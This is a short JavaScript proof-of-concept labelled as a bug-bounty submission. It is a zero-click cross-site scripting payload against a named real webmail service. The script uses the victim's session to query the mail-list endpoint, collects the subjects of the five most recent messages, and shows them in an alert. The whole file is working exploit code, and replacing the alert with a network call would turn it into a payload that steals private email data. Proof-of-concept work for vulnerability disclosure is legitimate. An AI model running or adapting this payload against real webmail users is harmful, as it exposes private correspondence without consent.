// PoC: 0-Click XSS in BOL/UOL Webmail
// Bug Bounty - BugHunt authorized testing only
// Target: bmail.uol.com.br
(function(){
  var domain = document.domain;
  fetch('/services/mail/list?accountId=0&folder=INBOX&limit=5&order=DESC&page=1&sort_terms=ARRIVAL&start=0')
    .then(function(r){return r.json()})
    .then(function(data){
      var subjects = data.items.map(function(m){return m.subject}).join('\n- ');
      alert('XSS on ' + domain + '\n\nVictim emails:\n- ' + subjects);
    })
    .catch(function(){
      alert('XSS on ' + domain);
    });
})();
